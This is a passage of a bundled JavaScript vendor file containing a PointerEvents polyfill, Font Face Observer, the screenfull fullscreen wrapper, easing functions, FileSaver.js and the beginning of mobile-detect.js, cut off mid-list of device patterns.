  INSTALLER = new Installer(touchEvents.elementAdded, touchEvents.elementRemoved,
    touchEvents.elementChanged, touchEvents);

  var pointermap$2 = dispatcher.pointermap;
  var HAS_BITMAP_TYPE = window.MSPointerEvent &&
    typeof window.MSPointerEvent.MSPOINTER_TYPE_MOUSE === 'number';
  var msEvents = {
    events: [
      'MSPointerDown',
      'MSPointerMove',
      'MSPointerUp',
      'MSPointerOut',
      'MSPointerOver',
      'MSPointerCancel',
      'MSGotPointerCapture',
      'MSLostPointerCapture'
    ],
    register: function(target) {
      dispatcher.listen(target, this.events);
    },
    unregister: function(target) {
      dispatcher.unlisten(target, this.events);
    },
    POINTER_TYPES: [
      '',
      'unavailable',
      'touch',
      'pen',
      'mouse'
    ],
    prepareEvent: function(inEvent) {
      var e = inEvent;
      if (HAS_BITMAP_TYPE) {
        e = dispatcher.cloneEvent(inEvent);
        e.pointerType = this.POINTER_TYPES[inEvent.pointerType];
      }
      return e;
    },
    cleanup: function(id) {
      pointermap$2.delete(id);
    },
    MSPointerDown: function(inEvent) {
      pointermap$2.set(inEvent.pointerId, inEvent);
      var e = this.prepareEvent(inEvent);
      dispatcher.down(e);
    },
    MSPointerMove: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.move(e);
    },
    MSPointerUp: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.up(e);
      this.cleanup(inEvent.pointerId);
    },
    MSPointerOut: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.leaveOut(e);
    },
    MSPointerOver: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.enterOver(e);
    },
    MSPointerCancel: function(inEvent) {
      var e = this.prepareEvent(inEvent);
      dispatcher.cancel(e);
      this.cleanup(inEvent.pointerId);
    },
    MSLostPointerCapture: function(inEvent) {
      var e = dispatcher.makeEvent('lostpointercapture', inEvent);
      dispatcher.dispatchEvent(e);
    },
    MSGotPointerCapture: function(inEvent) {
      var e = dispatcher.makeEvent('gotpointercapture', inEvent);
      dispatcher.dispatchEvent(e);
    }
  };

  function applyPolyfill() {

    // only activate if this platform does not have pointer events
    if (!window.PointerEvent) {
      window.PointerEvent = PointerEvent;

      if (window.navigator.msPointerEnabled) {
        var tp = window.navigator.msMaxTouchPoints;
        Object.defineProperty(window.navigator, 'maxTouchPoints', {
          value: tp,
          enumerable: true
        });
        dispatcher.registerSource('ms', msEvents);
      } else {
        Object.defineProperty(window.navigator, 'maxTouchPoints', {
          value: 0,
          enumerable: true
        });
        dispatcher.registerSource('mouse', mouseEvents);
        if (window.ontouchstart !== undefined) {
          dispatcher.registerSource('touch', touchEvents);
        }
      }

      dispatcher.register(document);
    }
  }

  var n = window.navigator;
  var s;
  var r;
  var h;
  function assertActive(id) {
    if (!dispatcher.pointermap.has(id)) {
      var error = new Error('InvalidPointerId');
      error.name = 'InvalidPointerId';
      throw error;
    }
  }
  function assertConnected(elem) {
    var parent = elem.parentNode;
    while (parent && parent !== elem.ownerDocument) {
      parent = parent.parentNode;
    }
    if (!parent) {
      var error = new Error('InvalidStateError');
      error.name = 'InvalidStateError';
      throw error;
    }
  }
  function inActiveButtonState(id) {
    var p = dispatcher.pointermap.get(id);
    return p.buttons !== 0;
  }
  if (n.msPointerEnabled) {
    s = function(pointerId) {
      assertActive(pointerId);
      assertConnected(this);
      if (inActiveButtonState(pointerId)) {
        dispatcher.setCapture(pointerId, this, true);
        this.msSetPointerCapture(pointerId);
      }
    };
    r = function(pointerId) {
      assertActive(pointerId);
      dispatcher.releaseCapture(pointerId, true);
      this.msReleasePointerCapture(pointerId);
    };
  } else {
    s = function setPointerCapture(pointerId) {
      assertActive(pointerId);
      assertConnected(this);
      if (inActiveButtonState(pointerId)) {
        dispatcher.setCapture(pointerId, this);
      }
    };
    r = function releasePointerCapture(pointerId) {
      assertActive(pointerId);
      dispatcher.releaseCapture(pointerId);
    };
  }
  h = function hasPointerCapture(pointerId) {
    return !!dispatcher.captureInfo[pointerId];
  };

  function applyPolyfill$1() {
    if (window.Element && !Element.prototype.setPointerCapture) {
      Object.defineProperties(Element.prototype, {
        'setPointerCapture': {
          value: s
        },
        'releasePointerCapture': {
          value: r
        },
        'hasPointerCapture': {
          value: h
        }
      });
    }
  }

  applyAttributeStyles();
  applyPolyfill();
  applyPolyfill$1();

  var pointerevents = {
    dispatcher: dispatcher,
    Installer: Installer,
    PointerEvent: PointerEvent,
    PointerMap: PointerMap,
    targetFinding: targeting
  };

  return pointerevents;

}));
/* Font Face Observer v2.3.0 - © Bram Stein. License: BSD-3-Clause */(function(){'use strict';var f,g=[];function l(a){g.push(a);1==g.length&&f()}function m(){for(;g.length;)g[0](),g.shift()}f=function(){setTimeout(m)};function n(a){this.a=p;this.b=void 0;this.f=[];var b=this;try{a(function(a){q(b,a)},function(a){r(b,a)})}catch(c){r(b,c)}}var p=2;function t(a){return new n(function(b,c){c(a)})}function u(a){return new n(function(b){b(a)})}function q(a,b){if(a.a==p){if(b==a)throw new TypeError;var c=!1;try{var d=b&&b.then;if(null!=b&&"object"==typeof b&&"function"==typeof d){d.call(b,function(b){c||q(a,b);c=!0},function(b){c||r(a,b);c=!0});return}}catch(e){c||r(a,e);return}a.a=0;a.b=b;v(a)}}
function r(a,b){if(a.a==p){if(b==a)throw new TypeError;a.a=1;a.b=b;v(a)}}function v(a){l(function(){if(a.a!=p)for(;a.f.length;){var b=a.f.shift(),c=b[0],d=b[1],e=b[2],b=b[3];try{0==a.a?"function"==typeof c?e(c.call(void 0,a.b)):e(a.b):1==a.a&&("function"==typeof d?e(d.call(void 0,a.b)):b(a.b))}catch(h){b(h)}}})}n.prototype.g=function(a){return this.c(void 0,a)};n.prototype.c=function(a,b){var c=this;return new n(function(d,e){c.f.push([a,b,d,e]);v(c)})};
function w(a){return new n(function(b,c){function d(c){return function(d){h[c]=d;e+=1;e==a.length&&b(h)}}var e=0,h=[];0==a.length&&b(h);for(var k=0;k<a.length;k+=1)u(a[k]).c(d(k),c)})}function x(a){return new n(function(b,c){for(var d=0;d<a.length;d+=1)u(a[d]).c(b,c)})};window.Promise||(window.Promise=n,window.Promise.resolve=u,window.Promise.reject=t,window.Promise.race=x,window.Promise.all=w,window.Promise.prototype.then=n.prototype.c,window.Promise.prototype["catch"]=n.prototype.g);}());

(function(){function p(a,c){document.addEventListener?a.addEventListener("scroll",c,!1):a.attachEvent("scroll",c)}function u(a){document.body?a():document.addEventListener?document.addEventListener("DOMContentLoaded",function b(){document.removeEventListener("DOMContentLoaded",b);a()}):document.attachEvent("onreadystatechange",function g(){if("interactive"==document.readyState||"complete"==document.readyState)document.detachEvent("onreadystatechange",g),a()})};function w(a){this.g=document.createElement("div");this.g.setAttribute("aria-hidden","true");this.g.appendChild(document.createTextNode(a));this.h=document.createElement("span");this.i=document.createElement("span");this.m=document.createElement("span");this.j=document.createElement("span");this.l=-1;this.h.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;";this.i.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;";
this.j.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;";this.m.style.cssText="display:inline-block;width:200%;height:200%;font-size:16px;max-width:none;";this.h.appendChild(this.m);this.i.appendChild(this.j);this.g.appendChild(this.h);this.g.appendChild(this.i)}
function x(a,c){a.g.style.cssText="max-width:none;min-width:20px;min-height:20px;display:inline-block;overflow:hidden;position:absolute;width:auto;margin:0;padding:0;top:-999px;white-space:nowrap;font-synthesis:none;font:"+c+";"}function B(a){var c=a.g.offsetWidth,b=c+100;a.j.style.width=b+"px";a.i.scrollLeft=b;a.h.scrollLeft=a.h.scrollWidth+100;return a.l!==c?(a.l=c,!0):!1}function C(a,c){function b(){var e=g;B(e)&&null!==e.g.parentNode&&c(e.l)}var g=a;p(a.h,b);p(a.i,b);B(a)};function D(a,c,b){c=c||{};b=b||window;this.family=a;this.style=c.style||"normal";this.weight=c.weight||"normal";this.stretch=c.stretch||"normal";this.context=b}var E=null,F=null,G=null,H=null;function I(a){null===F&&(M(a)&&/Apple/.test(window.navigator.vendor)?(a=/AppleWebKit\/([0-9]+)(?:\.([0-9]+))(?:\.([0-9]+))/.exec(window.navigator.userAgent),F=!!a&&603>parseInt(a[1],10)):F=!1);return F}function M(a){null===H&&(H=!!a.document.fonts);return H}
function N(a,c){var b=a.style,g=a.weight;if(null===G){var e=document.createElement("div");try{e.style.font="condensed 100px sans-serif"}catch(q){}G=""!==e.style.font}return[b,g,G?a.stretch:"","100px",c].join(" ")}
D.prototype.load=function(a,c){var b=this,g=a||"BESbswy",e=0,q=c||3E3,J=(new Date).getTime();return new Promise(function(K,L){if(M(b.context)&&!I(b.context)){var O=new Promise(function(r,t){function h(){(new Date).getTime()-J>=q?t(Error(""+q+"ms timeout exceeded")):b.context.document.fonts.load(N(b,'"'+b.family+'"'),g).then(function(n){1<=n.length?r():setTimeout(h,25)},t)}h()}),P=new Promise(function(r,t){e=setTimeout(function(){t(Error(""+q+"ms timeout exceeded"))},q)});Promise.race([P,O]).then(function(){clearTimeout(e);
K(b)},L)}else u(function(){function r(){var d;if(d=-1!=k&&-1!=l||-1!=k&&-1!=m||-1!=l&&-1!=m)(d=k!=l&&k!=m&&l!=m)||(null===E&&(d=/AppleWebKit\/([0-9]+)(?:\.([0-9]+))/.exec(window.navigator.userAgent),E=!!d&&(536>parseInt(d[1],10)||536===parseInt(d[1],10)&&11>=parseInt(d[2],10))),d=E&&(k==y&&l==y&&m==y||k==z&&l==z&&m==z||k==A&&l==A&&m==A)),d=!d;d&&(null!==f.parentNode&&f.parentNode.removeChild(f),clearTimeout(e),K(b))}function t(){if((new Date).getTime()-J>=q)null!==f.parentNode&&f.parentNode.removeChild(f),
L(Error(""+q+"ms timeout exceeded"));else{var d=b.context.document.hidden;if(!0===d||void 0===d)k=h.g.offsetWidth,l=n.g.offsetWidth,m=v.g.offsetWidth,r();e=setTimeout(t,50)}}var h=new w(g),n=new w(g),v=new w(g),k=-1,l=-1,m=-1,y=-1,z=-1,A=-1,f=document.createElement("div");f.dir="ltr";x(h,N(b,"sans-serif"));x(n,N(b,"serif"));x(v,N(b,"monospace"));f.appendChild(h.g);f.appendChild(n.g);f.appendChild(v.g);b.context.document.body.appendChild(f);y=h.g.offsetWidth;z=n.g.offsetWidth;A=v.g.offsetWidth;t();
C(h,function(d){k=d;r()});x(h,N(b,'"'+b.family+'",sans-serif'));C(n,function(d){l=d;r()});x(n,N(b,'"'+b.family+'",serif'));C(v,function(d){m=d;r()});x(v,N(b,'"'+b.family+'",monospace'))})})};"object"===typeof module?module.exports=D:(window.FontFaceObserver=D,window.FontFaceObserver.prototype.load=D.prototype.load);}());

/* eslint-disable promise/prefer-await-to-then */

var methodMap = [
    [
        'requestFullscreen',
        'exitFullscreen',
        'fullscreenElement',
        'fullscreenEnabled',
        'fullscreenchange',
        'fullscreenerror',
    ],
    // New WebKit
    [
        'webkitRequestFullscreen',
        'webkitExitFullscreen',
        'webkitFullscreenElement',
        'webkitFullscreenEnabled',
        'webkitfullscreenchange',
        'webkitfullscreenerror',

    ],
    // Old WebKit
    [
        'webkitRequestFullScreen',
        'webkitCancelFullScreen',
        'webkitCurrentFullScreenElement',
        'webkitCancelFullScreen',
        'webkitfullscreenchange',
        'webkitfullscreenerror',

    ],
    [
        'mozRequestFullScreen',
        'mozCancelFullScreen',
        'mozFullScreenElement',
        'mozFullScreenEnabled',
        'mozfullscreenchange',
        'mozfullscreenerror',
    ],
    [
        'msRequestFullscreen',
        'msExitFullscreen',
        'msFullscreenElement',
        'msFullscreenEnabled',
        'MSFullscreenChange',
        'MSFullscreenError',
    ],
];

var nativeAPI = (function(){
    if (typeof document === 'undefined') {
        return false;
    }

    var unprefixedMethods = methodMap[0];
    var returnValue = {};

    for (var i = 0; i < methodMap.length; i++) {
        var methodList = methodMap[i];
        var exitFullscreenMethod = methodList ? methodList[1] : undefined;

        if (exitFullscreenMethod && exitFullscreenMethod in document) {
            for (var index = 0; index < methodList.length; index++) {
                var method = methodList[index];
                returnValue[unprefixedMethods[index]] = method;
            }
            return returnValue;
        }

    }

    return false;
}.bind(this))();

var eventNameMap = {
    change: nativeAPI.fullscreenchange,
    error: nativeAPI.fullscreenerror,
};

// eslint-disable-next-line import/no-mutable-exports
var screenfull = {
    // eslint-disable-next-line default-param-last
    request: function(element, options) {

        if(element === undefined)
            element = document.documentElement;

        return new Promise(function(resolve, reject) {
            var onFullScreenEntered = function() {
                screenfull.off('change', onFullScreenEntered);
                resolve();
            };

            screenfull.on('change', onFullScreenEntered);

            var returnPromise = element[nativeAPI.requestFullscreen](options);

            if (returnPromise instanceof Promise) {
                returnPromise.then(onFullScreenEntered).catch(reject);
            }
        });
    },
    exit: function() {
        return new Promise( function(resolve, reject){
            if (!screenfull.isFullscreen) {
                resolve();
                return;
            }

            var onFullScreenExit = function() {
                screenfull.off('change', onFullScreenExit);
                resolve();
            };

            screenfull.on('change', onFullScreenExit);

            var returnPromise = document[nativeAPI.exitFullscreen]();

            if (returnPromise instanceof Promise) {
                returnPromise.then(onFullScreenExit).catch(reject);
            }
        });
    },
    toggle: function(element, options) {
        return screenfull.isFullscreen ? screenfull.exit() : screenfull.request(element, options);
    },
    onchange: function(callback) {
        screenfull.on('change', callback);
    },
    onerror: function(callback) {
        screenfull.on('error', callback);
    },
    on: function(event, callback) {
        var eventName = eventNameMap[event];
        if (eventName) {
            document.addEventListener(eventName, callback, false);
        }
    },
    off: function(event, callback) {
        var eventName = eventNameMap[event];
        if (eventName) {
            document.removeEventListener(eventName, callback, false);
        }
    },
    raw: nativeAPI,
};

Object.defineProperties(screenfull, {
    isFullscreen: {
        get: function() { return Boolean(document[nativeAPI.fullscreenElement]) } ,
    },
    element: {
        enumerable: true,
        get: function() { return document[nativeAPI.fullscreenElement] } ,
    },
    isEnabled: {
        enumerable: true,
        // Coerce to boolean in case of old WebKit.
        get: function() { return Boolean(document[nativeAPI.fullscreenEnabled]) },
    },
});

if (!nativeAPI) {
    screenfull = {isEnabled: false};
}


// Based on https://gist.github.com/gre/1650294

// No easing, no acceleration
function linear( t )
{
	return t;
}

// Slight acceleration from zero to full speed
function easeInSine( t )
{
	return -1 * Math.cos( t * ( Math.PI / 2 ) ) + 1;
}

// Slight deceleration at the end
function easeOutSine( t )
{
	return Math.sin( t * ( Math.PI / 2 ) );
}

// Slight acceleration at beginning and slight deceleration at end
function easeInOutSine( t )
{
	return -0.5 * ( Math.cos( Math.PI * t ) - 1 );
}

// Accelerating from zero velocity
function easeInQuad( t )
{
	return t * t;
}

// Decelerating to zero velocity
function easeOutQuad( t )
{
	return t * ( 2 - t );
}

// Acceleration until halfway, then deceleration
function easeInOutQuad( t )
{
	return t < 0.5 ? 2 * t * t : - 1 + ( 4 - 2 * t ) * t;
}

// Accelerating from zero velocity
function easeInCubic( t )
{
	return t * t * t;
}

// Decelerating to zero velocity
function easeOutCubic( t )
{
	var t1 = t - 1;
	return t1 * t1 * t1 + 1;
}

// Acceleration until halfway, then deceleration
function easeInOutCubic( t )
{
	return t < 0.5 ? 4 * t * t * t : ( t - 1 ) * ( 2 * t - 2 ) * ( 2 * t - 2 ) + 1;
}

// Accelerating from zero velocity
function easeInQuart( t )
{
	return t * t * t * t;
}

// Decelerating to zero velocity
function easeOutQuart( t )
{
	var t1 = t - 1;
	return 1 - t1 * t1 * t1 * t1;
}

// Acceleration until halfway, then deceleration
function easeInOutQuart( t ) {
	var t1 = t - 1;
	return t < 0.5 ? 8 * t * t * t * t : 1 - 8 * t1 * t1 * t1 * t1;
}

// Accelerating from zero velocity
function easeInQuint( t )
{
	return t * t * t * t * t;
}

// Decelerating to zero velocity
function easeOutQuint( t )
{
	var t1 = t - 1;
	return 1 + t1 * t1 * t1 * t1 * t1;
}

// Acceleration until halfway, then deceleration
function easeInOutQuint( t )
{
	var t1 = t - 1;
	return t < 0.5 ? 16 * t * t * t * t * t : 1 + 16 * t1 * t1 * t1 * t1 * t1;
}

// Accelerate exponentially until finish
function easeInExpo( t )
{

	if( t === 0 ) {
		return 0;
	}

	return Math.pow( 2, 10 * ( t - 1 ) );

}

// Initial exponential acceleration slowing to stop
function easeOutExpo( t )
{

	if( t === 1 ) {
		return 1;
	}

	return ( -Math.pow( 2, -10 * t ) + 1 );

}

// Exponential acceleration and deceleration
function easeInOutExpo( t )
{

	if( t === 0 || t === 1 ) {
		return t;
	}

	var scaledTime = t * 2;
	var scaledTime1 = scaledTime - 1;

	if( scaledTime < 1 ) {
		return 0.5 * Math.pow( 2, 10 * ( scaledTime1 ) );
	}

	return 0.5 * ( -Math.pow( 2, -10 * scaledTime1 ) + 2 );

}

// Increasing velocity until stop
function easeInCirc( t )
{

	var scaledTime = t / 1;
	return -1 * ( Math.sqrt( 1 - scaledTime * t ) - 1 );

}

// Start fast, decreasing velocity until stop
function easeOutCirc( t )
{

	var t1 = t - 1;
	return Math.sqrt( 1 - t1 * t1 );
}

// Fast increase in velocity, fast decrease in velocity
function easeInOutCirc( t )
{

	var scaledTime = t * 2;
	var scaledTime1 = scaledTime - 2;

	if( scaledTime < 1 ) {
		return -0.5 * ( Math.sqrt( 1 - scaledTime * scaledTime ) - 1 );
	}

	return 0.5 * ( Math.sqrt( 1 - scaledTime1 * scaledTime1 ) + 1 );

}

// Slow movement backwards then fast snap to finish
function easeInBack( t, magnitude)
{

	if(magnitude === undefined)
		magnitude = 1.70158;

	return t * t * ( ( magnitude + 1 ) * t - magnitude );

}

// Fast snap to backwards point then slow resolve to finish
function easeOutBack( t, magnitude )
{

	if(magnitude === undefined)
		magnitude = 1.70158;

	var scaledTime = ( t / 1 ) - 1;

	return (
		scaledTime * scaledTime * ( ( magnitude + 1 ) * scaledTime + magnitude )
	) + 1;

}

// Slow movement backwards, fast snap to past finish, slow resolve to finish
function easeInOutBack( t, magnitude )
{
	if(magnitude === undefined)
		magnitude = 1.70158;

	var scaledTime = t * 2;
	var scaledTime2 = scaledTime - 2;

	var s = magnitude * 1.525;

	if( scaledTime < 1) {

		return 0.5 * scaledTime * scaledTime * (
			( ( s + 1 ) * scaledTime ) - s
		);

	}

	return 0.5 * (
		scaledTime2 * scaledTime2 * ( ( s + 1 ) * scaledTime2 + s ) + 2
	);

}
// Bounces slowly then quickly to finish
function easeInElastic( t, magnitude)
{
	if(magnitude === undefined)
		magnitude = 0.7;

	if( t === 0 || t === 1 ) {
		return t;
	}

	var scaledTime = t / 1;
	var scaledTime1 = scaledTime - 1;

	var p = 1 - magnitude;
	var s = p / ( 2 * Math.PI ) * Math.asin( 1 );

	return -(
		Math.pow( 2, 10 * scaledTime1 ) *
		Math.sin( ( scaledTime1 - s ) * ( 2 * Math.PI ) / p )
	);

}

// Fast acceleration, bounces to zero
function easeOutElastic( t, magnitude)
{
	if(magnitude === undefined)
		magnitude = 0.7;

	if( t === 0 || t === 1 ) {
		return t;
	}

	var p = 1 - magnitude;
	var scaledTime = t * 2;

	var s = p / ( 2 * Math.PI ) * Math.asin( 1 );
	return (
		Math.pow( 2, -10 * scaledTime ) *
		Math.sin( ( scaledTime - s ) * ( 2 * Math.PI ) / p )
	) + 1;

}

// Slow start and end, two bounces sandwich a fast motion
function easeInOutElastic( t, magnitude) {

	if(magnitude === undefined)
		magnitude = 0.65;

	if( t === 0 || t === 1 ) {
		return t;
	}

	var p = 1 - magnitude;
	var scaledTime = t * 2;
	var scaledTime1 = scaledTime - 1;

	var s = p / ( 2 * Math.PI ) * Math.asin( 1 );

	if( scaledTime < 1 ) {
		return -0.5 * (
			Math.pow( 2, 10 * scaledTime1 ) *
			Math.sin( ( scaledTime1 - s ) * ( 2 * Math.PI ) / p )
		);
	}

	return (
		Math.pow( 2, -10 * scaledTime1 ) *
		Math.sin( ( scaledTime1 - s ) * ( 2 * Math.PI ) / p ) * 0.5
	) + 1;

}

// Bounce to completion
function easeOutBounce( t )
{

	var scaledTime = t / 1;

	if( scaledTime < ( 1 / 2.75 ) ) {

		return 7.5625 * scaledTime * scaledTime;

	} else if( scaledTime < ( 2 / 2.75 ) ) {

		var scaledTime2 = scaledTime - ( 1.5 / 2.75 );
		return ( 7.5625 * scaledTime2 * scaledTime2 ) + 0.75;

	} else if( scaledTime < ( 2.5 / 2.75 ) ) {

		var scaledTime2 = scaledTime - ( 2.25 / 2.75 );
		return ( 7.5625 * scaledTime2 * scaledTime2 ) + 0.9375;

	} else {

		var scaledTime2 = scaledTime - ( 2.625 / 2.75 );
		return ( 7.5625 * scaledTime2 * scaledTime2 ) + 0.984375;

	}

}

// Bounce increasing in velocity until completion
function easeInBounce( t )
{
	return 1 - easeOutBounce( 1 - t );
}

// Bounce in and bounce out
function easeInOutBounce( t )
{

	if( t < 0.5 ) {

		return easeInBounce( t * 2 ) * 0.5;

	}

	return ( easeOutBounce( ( t * 2 ) - 1 ) * 0.5 ) + 0.5;
}
/*
* FileSaver.js
* A saveAs() FileSaver implementation.
*
* By Eli Grey, http://eligrey.com
*
* License : https://github.com/eligrey/FileSaver.js/blob/master/LICENSE.md (MIT)
* source  : http://purl.eligrey.com/github/FileSaver.js
*/

// The one and only way of getting global scope in all environments
// https://stackoverflow.com/q/3277182/1008999
var _global = typeof window === 'object' && window.window === window
	? window : typeof self === 'object' && self.self === self
		? self : typeof global === 'object' && global.global === global
			? global
			: this

function bom (blob, opts) {
	if (typeof opts === 'undefined') opts = { autoBom: false }
	else if (typeof opts !== 'object') {
		console.warn('Deprecated: Expected third argument to be a object')
		opts = { autoBom: !opts }
	}

	// prepend BOM for UTF-8 XML and text/* types (including HTML)
	// note: your browser will automatically convert UTF-16 U+FEFF to EF BB BF
	if (opts.autoBom && /^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(blob.type)) {
		return new Blob([String.fromCharCode(0xFEFF), blob], { type: blob.type })
	}
	return blob
}

function download (url, name, opts) {
	var xhr = new XMLHttpRequest()
	xhr.open('GET', url)
	xhr.responseType = 'blob'
	xhr.onload = function () {
		saveAs(xhr.response, name, opts)
	}
	xhr.onerror = function () {
		console.error('could not download file')
	}
	xhr.send()
}

function corsEnabled (url) {
	var xhr = new XMLHttpRequest()
	// use sync to avoid popup blocker
	xhr.open('HEAD', url, false)
	try {
		xhr.send()
	} catch (e) {}
	return xhr.status >= 200 && xhr.status <= 299
}

// `a.click()` doesn't work for all browsers (#465)
function click (node) {
	try {
		node.dispatchEvent(new MouseEvent('click'))
	} catch (e) {
		var evt = document.createEvent('MouseEvents')
		evt.initMouseEvent('click', true, true, window, 0, 0, 0, 80,
			20, false, false, false, false, 0, null)
		node.dispatchEvent(evt)
	}
}

// Detect WebView inside a native macOS app by ruling out all browsers
// We just need to check for 'Safari' because all other browsers (besides Firefox) include that too
// https://www.whatismybrowser.com/guides/the-latest-user-agent/macos
var isMacOSWebView = _global.navigator && /Macintosh/.test(navigator.userAgent) && /AppleWebKit/.test(navigator.userAgent) && !/Safari/.test(navigator.userAgent)

var saveAs = _global.saveAs || (
	// probably in some web worker
	(typeof window !== 'object' || window !== _global)
		? function saveAs () { /* noop */ }

		// Use download attribute first if possible (#193 Lumia mobile) unless this is a macOS WebView
		: ('download' in HTMLAnchorElement.prototype && !isMacOSWebView)
			? function saveAs (blob, name, opts) {
				var URL = _global.URL || _global.webkitURL
				// Namespace is used to prevent conflict w/ Chrome Poper Blocker extension (Issue #561)
				var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a')
				name = name || blob.name || 'download'

				a.download = name
				a.rel = 'noopener' // tabnabbing

				// TODO: detect chrome extensions & packaged apps
				// a.target = '_blank'

				if (typeof blob === 'string') {
					// Support regular links
					a.href = blob
					if (a.origin !== location.origin) {
						corsEnabled(a.href)
							? download(blob, name, opts)
							: click(a, a.target = '_blank')
					} else {
						click(a)
					}
				} else {
					// Support blobs
					a.href = URL.createObjectURL(blob)
					setTimeout(function () { URL.revokeObjectURL(a.href) }, 4E4) // 40s
					setTimeout(function () { click(a) }, 0)
				}
			}

			// Use msSaveOrOpenBlob as a second approach
			: 'msSaveOrOpenBlob' in navigator
				? function saveAs (blob, name, opts) {
					name = name || blob.name || 'download'

					if (typeof blob === 'string') {
						if (corsEnabled(blob)) {
							download(blob, name, opts)
						} else {
							var a = document.createElement('a')
							a.href = blob
							a.target = '_blank'
							setTimeout(function () { click(a) })
						}
					} else {
						navigator.msSaveOrOpenBlob(bom(blob, opts), name)
					}
				}

				// Fallback to using FileReader and a popup
				: function saveAs (blob, name, opts, popup) {
					// Open a popup immediately do go around popup blocker
					// Mostly only available on user interaction and the fileReader is async so...
					popup = popup || open('', '_blank')
					if (popup) {
						popup.document.title =
							popup.document.body.innerText = 'downloading...'
					}

					if (typeof blob === 'string') return download(blob, name, opts)

					var force = blob.type === 'application/octet-stream'
					var isSafari = /constructor/i.test(_global.HTMLElement) || _global.safari
					var isChromeIOS = /CriOS\/[\d]+/.test(navigator.userAgent)

					if ((isChromeIOS || (force && isSafari) || isMacOSWebView) && typeof FileReader !== 'undefined') {
						// Safari doesn't allow downloading of blob URLs
						var reader = new FileReader()
						reader.onloadend = function () {
							var url = reader.result
							url = isChromeIOS ? url : url.replace(/^data:[^;]*;/, 'data:attachment/file;')
							if (popup) popup.location.href = url
							else location = url
							popup = null // reverse-tabnabbing #460
						}
						reader.readAsDataURL(blob)
					} else {
						var URL = _global.URL || _global.webkitURL
						var url = URL.createObjectURL(blob)
						if (popup) popup.location = url
						else location.href = url
						popup = null // reverse-tabnabbing #460
						setTimeout(function () { URL.revokeObjectURL(url) }, 4E4) // 40s
					}
				}
)

_global.saveAs = saveAs.saveAs = saveAs

if (typeof module !== 'undefined') {
	module.exports = saveAs;
}
/*!@license Copyright 2013, Heinrich Goebl, License: MIT, see https://github.com/hgoebl/mobile-detect.js*/
!function(a,b){a(function(){"use strict";function a(a,b){return null!=a&&null!=b&&a.toLowerCase()===b.toLowerCase()}function c(a,b){var c,d,e=a.length;if(!e||!b)return!1;for(c=b.toLowerCase(),d=0;d<e;++d)if(c===a[d].toLowerCase())return!0;return!1}function d(a){for(var b in a)i.call(a,b)&&(a[b]=new RegExp(a[b],"i"))}function e(a){return(a||"").substr(0,500)}function f(a,b){this.ua=e(a),this._cache={},this.maxPhoneWidth=b||600}var g={};g.mobileDetectRules={phones:{iPhone:"\\biPhone\\b|\\biPod\\b",BlackBerry:"BlackBerry|\\bBB10\\b|rim[0-9]+|\\b(BBA100|BBB100|BBD100|BBE100|BBF100|STH100)\\b-[0-9]+",Pixel:"; \\bPixel\\b",HTC:"HTC|HTC.*(Sensation|Evo|Vision|Explorer|6800|8100|8900|A7272|S510e|C110e|Legend|Desire|T8282)|APX515CKT|Qtek9090|APA9292KT|HD_mini|Sensation.*Z710e|PG86100|Z715e|Desire.*(A8181|HD)|ADR6200|ADR6400L|ADR6425|001HT|Inspire 4G|Android.*\\bEVO\\b|T-Mobile G1|Z520m|Android [0-9.]+; Pixel",Nexus:"Nexus One|Nexus S|Galaxy.*Nexus|Android.*Nexus.*Mobile|Nexus 4|Nexus 5|Nexus 5X|Nexus 6",Dell:"Dell[;]? (Streak|Aero|Venue|Venue Pro|Flash|Smoke|Mini 3iX)|XCD28|XCD35|\\b001DL\\b|\\b101DL\\b|\\bGS01\\b",Motorola:"Motorola|DROIDX|DROID BIONIC|\\bDroid\\b.*Build|Android.*Xoom|HRI39|MOT-|A1260|A1680|A555|A853|A855|A953|A955|A956|Motorola.*ELECTRIFY|Motorola.*i1|i867|i940|MB200|MB300|MB501|MB502|MB508|MB511|MB520|MB525|MB526|MB611|MB612|MB632|MB810|MB855|MB860|MB861|MB865|MB870|ME501|ME502|ME511|ME525|ME600|ME632|ME722|ME811|ME860|ME863|ME865|MT620|MT710|MT716|MT720|MT810|MT870|MT917|Motorola.*TITANIUM|WX435|WX445|XT300|XT301|XT311|XT316|XT317|XT319|XT320|XT390|XT502|XT530|XT531|XT532|XT535|XT603|XT610|XT611|XT615|XT681|XT701|XT702|XT711|XT720|XT800|XT806|XT860|XT862|XT875|XT882|XT883|XT894|XT901|XT907|XT909|XT910|XT912|XT928|XT926|XT915|XT919|XT925|XT1021|\\bMoto 